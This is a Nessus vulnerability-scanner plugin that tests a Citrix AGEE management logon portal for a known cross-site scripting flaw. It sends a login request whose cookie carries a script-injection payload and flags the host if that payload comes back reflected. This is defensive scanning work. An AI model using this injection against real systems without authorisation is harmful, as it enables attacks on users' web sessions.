#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(67200);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/05/11 13:32:18 $");

  script_bugtraq_id(49294);
  script_osvdb_id(74724);
  script_xref(name:"Secunia", value:"45726");
  script_xref(name:"IAVB", value:"2011-B-0111");

  script_name(english:"Citrix AGEE Logon Portal Unspecified XSS");
  script_summary(english:"Attempts XSS against Citrix AGEE management interface.");

  script_set_attribute(attribute:"synopsis", value:"The remote web application is prone to cross-site scripting attacks.");
  script_set_attribute(attribute:"description", value:
"The remote Citrix AGEE web management interface is susceptible to
cross-site scripting attacks.");
  script_set_attribute(attribute:"see_also", value:"http://support.citrix.com/article/CTX129971");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 9.2-50.4 or higher.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/08/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/08/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/07/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:citrix:netscaler_access_gateway:-:-:enterprise");
  script_set_attribute(attribute:"stig_severity", value:"II");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");
  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("netscaler_web_login.nasl");
  script_require_keys("www/netscaler");
  script_require_ports("Services/www",80);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

get_kb_item_or_exit("www/netscaler");
port = get_http_port(default:80, embedded:TRUE);

url = "/login/do_login";
text = "var unitFromCookie = 'Minutes";
xss = '\';alert("' + SCRIPT_NAME + '-' + unixtime() + '")+\'';
headers = make_array();
headers['Cookie'] = "startupapp=guia; timeout=30; unit=Minutes" + urlencode(str:xss) + "; jvm_memory=256M";
data = "username=nessus&password=nessus&startin=guia&timeout=30&unit=Minutes&jvm_memory=256M&url=&timezone_offset=-14400&B1=Login";

res = http_send_recv3(method:'POST',
                      item:url,
                      port:port,
                      data:data,
                      add_headers:headers,
                      exit_on_fail:TRUE);

if ((text + xss) >< res[2])
{
  report = NULL;
  snip = crap(data:"-", length:30) + ' snip ' + crap(data:"-",length:30);
  output = extract_pattern_from_resp(string:res[2],
                                     pattern:"ST:" + text + xss);
  set_kb_item(name:'www/' + port + '/XSS', value:TRUE);
  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);

    report +=
        '\nNessus was able to verify the issue exists using the following request :' +
        '\n' +
        '\n' + http_last_sent_request() +
        '\n';

    if (report_verbosity > 1)
    {
      report +=
        '\nThis produced the following response :' +
        '\n' +
        '\n' + snip +
        '\n' + output +
        '\n' + snip +
        '\n';
    }
  }
  security_warning(port:port, extra:report);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Citrix AGEE", build_url(port:port, qs:url));
